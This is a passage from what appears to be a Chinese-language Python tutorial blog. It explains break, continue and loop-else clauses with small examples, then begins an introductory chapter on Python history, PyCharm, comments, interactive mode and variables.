title="引入"></a>引入</h5><p>在循环的过程中，有时可能会因为某些条件的满足或者不满足需要结束整个<code>while</code>，还有可能在当次循环代码执行过程中剩下的不执行了而是进行一次的循环，这种时候就需要用2个功能</p><ul><li>结束整个循环</li><li>结束本次循环</li></ul><p>还好，<code>Python</code>的发明人，针对上述2个功能，发明除了对应的代码</p><ul><li><code>break</code>，用来结束整个循环</li><li><code>continue</code>，用来结束本次循环</li></ul><h5 id="break-基本使用"><a href="#break-基本使用" class="headerlink" title="break 基本使用"></a>break 基本使用</h5><p><code>break</code>的作用是：结束它所属的整个循环</p><p>注意点：它不能单独使用，如果用的话一定需要放到循环中</p><p><strong>while 中使用 break</strong></p><ul><li><p>未使用 break 的效果</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">----</span><br><span class="line">0</span><br><span class="line">----</span><br><span class="line">1</span><br><span class="line">----</span><br><span class="line">2</span><br><span class="line">----</span><br><span class="line">3</span><br><span class="line">----</span><br><span class="line">4</span><br></pre></td></tr></table></figure></li><li><p>使用 break 的效果</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">5</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>)</span><br><span class="line">    i = i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">----</span><br></pre></td></tr></table></figure><p>  说明：</p><ul><li>当程序执行到第6行时，遇到了<code>break</code>，那么此时<code>break</code>就会将它所在的<code>while</code>循环结束，所以只输出了一次<code>----</code></li></ul></li></ul><p><strong>for 循环中使用 break</strong></p><ul><li><p>未使用 break 的效果</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">web_site = <span class="string">&#x27;www.tulingxueyuan.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> web_site:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">w</span><br><span class="line">w</span><br><span class="line">w</span><br><span class="line">.</span><br><span class="line">t</span><br><span class="line">u</span><br><span class="line">l</span><br><span class="line">i</span><br><span class="line">n</span><br><span class="line">g</span><br><span class="line">x</span><br><span class="line">u</span><br><span class="line">e</span><br><span class="line">y</span><br><span class="line">u</span><br><span class="line">a</span><br><span class="line">n</span><br><span class="line">.</span><br><span class="line">c</span><br><span class="line">o</span><br><span class="line">m</span><br></pre></td></tr></table></figure></li><li><p>使用 break 的效果</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">web_site = <span class="string">&#x27;codetutor.top&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> web_site:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure><p>  说明：</p><ul><li>当程序执行到第5行<code>break</code>时，<code>break</code>会让整个<code>for</code>循环结束，所以只输出了第一个字母<code>c</code></li></ul></li></ul><h5 id="continue-的基本使用"><a href="#continue-的基本使用" class="headerlink" title="continue 的基本使用"></a>continue 的基本使用</h5><p><strong>while 中使用 continue</strong></p><ul><li><p>使用 continue 的效果</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">3</span>:</span><br><span class="line">    i = i+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">----</span><br><span class="line">----</span><br><span class="line">----</span><br></pre></td></tr></table></figure><p>  小提示：代码执行过程通过Debug调试模式进行探究。</p></li></ul><p><strong>for 中使用continue</strong></p><ul><li><p>带有 continue 的循环示例如下：</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">web_site = <span class="string">&#x27;codetutor.top&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> web_site:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">o</span><br><span class="line">d</span><br><span class="line">e</span><br><span class="line">t</span><br><span class="line">u</span><br><span class="line">t</span><br><span class="line">o</span><br><span class="line">r</span><br><span class="line">.</span><br><span class="line">t</span><br><span class="line">o</span><br><span class="line">p</span><br></pre></td></tr></table></figure><p>  说明：</p><ul><li>当程序遇到<code>continue</code>时，会导致本次<code>for</code>循环体中剩下的代码不会执行，而是进入下一次的循环</li></ul></li></ul><h5 id="常见的用法"><a href="#常见的用法" class="headerlink" title="常见的用法"></a>常见的用法</h5><p>通过上面的案例，我们知道break、continue是可以直接放到循环中使用的</p><p>但是，在循环中直接运行break、continue有意义吗？其实你也会感觉到有些不舒服，我们一般的用法是在判断语句中使用break、continue</p><p>示例如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">3</span></span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：（还剩%d次机会）&quot;</span> % i)</span><br><span class="line">    <span class="keyword">if</span> password == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密码输入正确&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i -= <span class="number">1</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>如果密码输入正确，那么就不需要再次让用户输入密码，直接结束这个循环即可</li><li>一般情况下break、continue会在判断中使用，这样就能够实现该怎样循环的就怎样循环，不该循环的时候能立刻结束</li></ul><h5 id="在循环嵌套中使用"><a href="#在循环嵌套中使用" class="headerlink" title="在循环嵌套中使用"></a>在循环嵌套中使用</h5><p>阅读如下代码，思考最终会输出什么？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i=%d&quot;</span> % i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;---&quot;</span>)</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最终输出结果为：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">i=0</span><br><span class="line">---</span><br><span class="line">i=1</span><br><span class="line">---</span><br><span class="line">i=2</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p><strong>看到上述输出结果，我们发现：break作用在当前的循环体，并不会影响到外层循环！</strong></p><p><code>continue</code>在循环嵌套中的作用于<code>break</code>几乎一样，只不过它是结束本次循环，而<code>break</code>是结束整个循环</p><p><strong>切记口诀：break、continue在哪个循环中就对哪个循环起作用</strong></p><h5 id="break-与-continue-使用总结"><a href="#break-与-continue-使用总结" class="headerlink" title="break 与 continue 使用总结"></a>break 与 continue 使用总结</h5><ul><li><code>break</code>、<code>continue</code>只能用在循环中，除此以外不能单独使用</li><li><code>break</code>、<code>continue</code>在嵌套循环中，只对最近的一层循环起作用</li><li><code>break</code>能够立刻结束所在的循环</li><li><code>continue</code>的用来结束本次循环，紧接着执行下一次的循环</li><li>无论<code>break</code>放到<code>while</code>循环体中的任何位置，只要被执行一次，那么整个循环立刻结束</li></ul><h2 id="循环中的-else"><a href="#循环中的-else" class="headerlink" title="循环中的 else"></a>循环中的 else</h2><h5 id="引入-9"><a href="#引入-9" class="headerlink" title="引入"></a>引入</h5><p>看如下代码，想一想：怎样实现 “密码不正确的相应提示”</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">3</span></span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：（还剩%d次机会）&quot;</span> % i)</span><br><span class="line">    <span class="keyword">if</span> password == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密码输入正确&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i -= <span class="number">1</span></span><br></pre></td></tr></table></figure><p>想要实现在 “密码不正确” 时提示相应的信息，普通的做法是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span>  <span class="comment"># 定义一个变量，用来存储是否登录成功，True表示成功 False表示不成功</span></span><br><span class="line">i = <span class="number">3</span></span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：（还剩%d次机会）&quot;</span> % i)</span><br><span class="line">    <span class="keyword">if</span> password == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">        login_flag = <span class="literal">True</span>  <span class="comment"># 如果登录成功，那么这里就改为True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当上述的while循环结束后，判断login_flag的值，来输出对应的信息</span></span><br><span class="line"><span class="keyword">if</span> login_flag == <span class="literal">True</span>:  <span class="comment"># 简单的写法是if login_flag:</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密码输入正确&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密码输入不正确，今日3次机会已用完，请明天再试...&quot;</span>)</span><br></pre></td></tr></table></figure><p>上述的代码整体逻辑是：</p><ol><li>循环中获取密码判断是否正确，通过一个变量来标记正确与否</li><li>当循环结束后，在单独判断标记，然后输出对应的信息</li></ol><p>问题：有么有简单的方式呢？</p><p>答：<code>else</code></p><h5 id="while…else…-的使用方式"><a href="#while…else…-的使用方式" class="headerlink" title="while…else… 的使用方式"></a>while…else… 的使用方式</h5><p><strong>格式：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> 条件:</span><br><span class="line">    <span class="comment"># 条件满足时执行的代码...</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 如果上述的while循环没有调用break，就执行的代码...</span></span><br></pre></td></tr></table></figure><p>说明：</p><ul><li>只要while循环体中没有执行break，那么当while循环体中所有的代码执行完后，else中的代码也会执行</li><li>如果while循环中有break那么表示整个while结束，else中的代码也不会被执行</li></ul><p><strong>示例：</strong></p><ul><li><p>有 break 时：</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这是一段测试信息...&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;调用了break&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是else中的代码&quot;</span>)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">这是一段测试信息...</span><br><span class="line">调用了break</span><br></pre></td></tr></table></figure></li><li><p>没有 break 时</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这是一段测试信息...&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是else中的代码&quot;</span>)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">这是一段测试信息...</span><br><span class="line">这是一段测试信息...</span><br><span class="line">这是一段测试信息...</span><br><span class="line">我是else中的代码</span><br></pre></td></tr></table></figure></li></ul><h5 id="代码案例"><a href="#代码案例" class="headerlink" title="代码案例"></a>代码案例</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">3</span></span><br><span class="line"><span class="keyword">while</span> i &gt; <span class="number">0</span>:</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：（还剩%d次机会）&quot;</span> % i)</span><br><span class="line">    <span class="keyword">if</span> password == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密码输入正确&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i -= <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密码输入3次全部错误，请明日再试&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="for…else…-的使用方式"><a href="#for…else…-的使用方式" class="headerlink" title="for…else… 的使用方式"></a>for…else… 的使用方式</h5><p><strong>格式：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> 变量 <span class="keyword">in</span> 可迭代对对象:</span><br><span class="line">    <span class="comment"># 正常执行的代码</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># for未使用break时执行的代码</span></span><br></pre></td></tr></table></figure><p><strong>示例：</strong></p><ul><li><p>未使用 break</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i=%d&quot;</span> % i)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是else中的代码...&quot;</span>)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">i=0</span><br><span class="line">i=1</span><br><span class="line">i=2</span><br><span class="line">i=3</span><br><span class="line">i=4</span><br><span class="line">我是else中的代码....</span><br></pre></td></tr></table></figure></li><li><p>使用 break</p>  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i=%d&quot;</span> % i)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;我是break哦...&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是else中的代码...&quot;</span>)</span><br></pre></td></tr></table></figure><p>  运行结果：</p>  <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">i=0</span><br><span class="line">i=1</span><br><span class="line">我是break哦...</span><br></pre></td></tr></table></figure></li></ul><h5 id="代码案例-1"><a href="#代码案例-1" class="headerlink" title="代码案例"></a>代码案例</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&quot;请输入密码：（还剩%d次机会）&quot;</span> % i)</span><br><span class="line">    <span class="keyword">if</span> password == <span class="string">&quot;123456&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;密码输入正确&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密码输入3次全部错误，请明日再试&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="验证-continue"><a href="#验证-continue" class="headerlink" title="验证 continue"></a>验证 continue</h5><p>我们知道<code>continue</code>的作用是结束本次循环，那么既然<code>break</code>在<code>for...else...</code>和<code>while...else...</code>中都起作用，那么continue呢？</p><p>接下来我们就验证一下。</p><p>验证一：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">3</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;来了老弟...&quot;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;一起学Python啊，别忘了来 www.tulingxueyuan.com 网站哈&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是else中的代码...&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">来了老弟...</span><br><span class="line">来了老弟...</span><br><span class="line">来了老弟...</span><br><span class="line">我是else中的代码...</span><br></pre></td></tr></table></figure><p>验证二：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;来了老弟...&quot;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;一起学Python啊，别忘了来 www.tulingxueyuan.com 网站哈&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我是else中的代码...&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">来了老弟...</span><br><span class="line">来了老弟...</span><br><span class="line">来了老弟...</span><br><span class="line">我是else中的代码...</span><br></pre></td></tr></table></figure><p><strong>结论：</strong></p><ul><li>在<code>while...else...</code>与<code>for...else...</code>中，<code>break</code>会让<code>else</code>中的代码不执行，而<code>continue</code>没有这个功能</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1. 基础知识</title>
      <link href="/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1.%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html"/>
      <url>/Python%E5%85%A8%E6%A0%88/Python%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1.%20%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-初识-Python"><a href="#1-初识-Python" class="headerlink" title="1. 初识 Python"></a>1. 初识 Python</h3><h5 id="Python-简介"><a href="#Python-简介" class="headerlink" title="Python 简介"></a>Python 简介</h5><p>Python是由荷兰人吉多·范罗苏姆（Guido von Rossum）发明的一种编程语言，是目前世界上最受欢迎和拥有最多用户群体的编程语言。</p><h5 id="Python-历史"><a href="#Python-历史" class="headerlink" title="Python 历史"></a>Python 历史</h5><ol><li>1989年圣诞节：Guido开始写Python语言的编译器。</li><li>1991年2月：第一个Python解释器诞生，它是用C语言实现的，可以调用C语言的库函数。</li><li>1994年1月：Python 1.0正式发布。</li><li>2000年10月：Python 2.0发布，Python的整个开发过程更加透明，生态圈开始慢慢形成。</li><li>2008年12月：Python 3.0发布，引入了诸多现代编程语言的新特性，但并<strong>不完全兼容</strong>之前的Python代码。</li><li>2020年1月：在Python 2和Python 3共存了11年之后，官方停止了对Python 2的更新和维护，希望用户尽快过渡到Python 3。</li></ol><h5 id="Python-优缺点"><a href="#Python-优缺点" class="headerlink" title="Python 优缺点"></a>Python 优缺点</h5><p>Python的优点很多，简单为大家列出几点。</p><ol><li>简单明确，跟其他很多语言相比，Python更容易上手。</li><li>能用更少的代码做更多的事情，提升开发效率。</li><li>开放源代码，拥有强大的社区和生态圈。</li><li>能够做的事情非常多，有极强的适应性。</li><li>能够在Windows、macOS、Linux等各种系统上运行。</li></ol><p>Python最主要的缺点是执行效率低，但是当我们更看重产品的开发效率而不是执行效率的时候，Python就是很好的选择。</p><h5 id="Python-应用领域"><a href="#Python-应用领域" class="headerlink" title="Python 应用领域"></a>Python 应用领域</h5><p>目前Python在<strong>Web服务器应用开发</strong>、云基础设施开发、<strong>网络数据采集</strong>（爬虫）、<strong>数据分析</strong>、量化交易、<strong>机器学习</strong>、<strong>深度学习</strong>、自动化测试、自动化运维等领域都有用武之地。</p><h3 id="2-第一个Python程序"><a href="#2-第一个Python程序" class="headerlink" title="2. 第一个Python程序"></a>2. 第一个Python程序</h3><h5 id="什么是Pycharm"><a href="#什么是Pycharm" class="headerlink" title="什么是Pycharm"></a>什么是Pycharm</h5><p><code>Pycharm</code>是一个软件，这个软件拥有很强的的功能，例如编写代码、调试代码、操作数据库等等</p><p>我们一般把拥有很多种功能为一身的专门用来学习或者开发程序的软件，称为<code>IDE</code>（集成开发环境）</p><p>其官方网站：<a href="https://www.jetbrains.com/pycharm/">https://www.jetbrains.com/pycharm/</a></p><h5 id="Python开发环境的搭建"><a href="#Python开发环境的搭建" class="headerlink" title="Python开发环境的搭建"></a>Python开发环境的搭建</h5><p>想要学习<code>Python</code>编程语言需要提前准备好用到的各种软件，像<code>Pycharm</code>等，当然除了它之外还可能需要很多其他的软件，例如<code>Sublime</code>、<code>Python解释器</code>、<code>MySQL</code>、<code>Redis</code>、<code>MongoDB</code>等等</p><h5 id="使用Pycharm构建第一个程序"><a href="#使用Pycharm构建第一个程序" class="headerlink" title="使用Pycharm构建第一个程序"></a>使用Pycharm构建第一个程序</h5><ol><li>打开 Pycharm，选择 <code>Create New Project</code>，创建一个新项目</li><li>选择<code>Pure Python</code>表示创建一个纯Python程序项目, <code>Location</code> 表示该项目保存的路径，<code>Interpreter</code> 表示使用的Python解释器版本，最后点击<code>Create</code> 创建项目。</li><li>右击项目，选择<code>New</code>，再选择<code>Python File</code></li><li>在弹出的对话框中输入的文件名<code>HelloPython</code>，点击<code>OK</code>，表示创建一个Python程序的文本文件，文本文件后缀名默认<code>.py</code></li><li>输入以下代码，并右击空白处，选择<code>Run</code>运行，表示打印一个字符串<code>&quot;Hello World!&quot;</code></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Hello World&#x27;</span>)</span><br></pre></td></tr></table></figure><ol start="6"><li>运行，空白处右击，选择<code>Run</code></li></ol><h3 id="3-注释"><a href="#3-注释" class="headerlink" title="3. 注释"></a>3. 注释</h3><h5 id="什么是注释"><a href="#什么是注释" class="headerlink" title="什么是注释"></a>什么是注释</h5><p>从小我们知道看书时，可以做一些笔记，能够把当时的灵感想法记录下来，以便在以后再次阅读时快速想起来</p><p>同样，Python编程语言是由英文编写的，很多时候怕忘记这些代码的作用以及注意点等，也需要写一点“笔记”，此时这些帮助我们的信息就成为“注释”</p><h5 id="注释的作用"><a href="#注释的作用" class="headerlink" title="注释的作用"></a>注释的作用</h5><p>通过用自己熟悉的语言，在程序中对某些代码进行标注说明，这就是注释的作用，能够大大增强程序的<code>可读性</code></p><h5 id="注释的分类"><a href="#注释的分类" class="headerlink" title="注释的分类"></a>注释的分类</h5><p><strong>单行注释</strong></p><p>以<code>#</code>开头，<code>#</code>右边的所有的内容当做说明，起辅助说明作用</p><p><strong>#右边带一个空格</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我是一个注释</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Hello&#x27;</span>)  <span class="comment"># 我是单行注释 在代码右侧从 # 开始都不当做程序，只能当做说明</span></span><br></pre></td></tr></table></figure><p><strong>多行注释</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">在三引号中的注释被称之为多行注释</span></span><br><span class="line"><span class="string">可以写很多行的功能说明</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">三个单引号也是多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4-交互模式"><a href="#4-交互模式" class="headerlink" title="4. 交互模式"></a>4. 交互模式</h3><h5 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h5><p>前面我们通过<code>Pycharm</code>这款<code>IDE</code>软件，能够编写代码还能够运行代码，感觉非常的好，用起来也很舒服简单</p><p>但有很多时候我们想快速的运行一个<code>Python</code>的小段代码，此时如果还是通过<code>Pycharm</code>那种创建项目–&gt;写代码–&gt;运行代码的方式有些繁琐</p><p>此时改怎样办呢？</p><p>答：Python的<code>交互模式</code></p><h5 id="Python-交互模式"><a href="#Python-交互模式" class="headerlink" title="Python 交互模式"></a>Python 交互模式</h5><p>所谓的<code>交互模式</code>，说的直白点，就是通过终端你输入一点代码，<code>Python解释器</code>运行一点代码的方式</p><h5 id="怎样开启"><a href="#怎样开启" class="headerlink" title="怎样开启"></a>怎样开启</h5><p>步骤1：打开终端</p><p>步骤2：输入<code>python</code>（注意全是小写字母），然后回车</p><h5 id="怎样使用"><a href="#怎样使用" class="headerlink" title="怎样使用"></a>怎样使用</h5><p>在按照上述步骤开起来Python交互模式之后，就可以直接输入想要的代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输入完代码后，按下回车，即可看到更过语句执行的结果</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hello</span><br></pre></td></tr></table></figure><h3 id="5-变量与常量"><a href="#5-变量与常量" class="headerlink" title="5. 变量与常量"></a>5. 变量与常量</h3><h5 id="引入-1"><a href="#引入-1" class="headerlink" title="引入"></a>引入</h5><p>程序中肯定需要用到各种数据，例如我们的工资要计算个人所得税，此时就用到各种数学的公式进行计算，从而得出个税；再例如想要计算圆的面积，就需要用到圆周率<code>π</code></p><p>程序中有2种”量”，一种是可以变的，一种是不能变的，我们将它们成为变量、常量</p><h5 id="常量的定义与作用"><a href="#常量的定义与作用" class="headerlink" title="常量的定义与作用"></a>常量的定义与作用</h5><p>那么什么是常量呢？</p><p>固定不变的量，就是常量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">6699</span>  <span class="comment"># 6699就是一个常量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">100</span>)  <span class="comment"># 这个100就是常量</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3.1415926</span>)  <span class="comment"># 3.1415926也是一个常量</span></span><br></pre></td></tr></table></figure><p>常量有什么作用？</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">100</span> + <span class="number">200</span> + <span class="number">300</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">3.14</span>*<span class="number">10</span>*<span class="number">10</span>)  <span class="comment"># 计算半径为10的 圆的面积</span></span><br></pre></td></tr></table></figure><h5 id="变量的定义与作用"><a href="#变量的定义与作用" class="headerlink" title="变量的定义与作用"></a>变量的定义与作用</h5><p>什么是变量？</p><p>一个可以变化的量，就是变量</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1 = <span class="number">100</span>  <span class="comment"># num1就是一个变量</span></span><br><span class="line">num2 = <span class="number">87</span>  <span class="comment"># num2也是一个变量</span></span><br><span class="line">pi = <span class="number">3.14</span>  <span class="comment"># 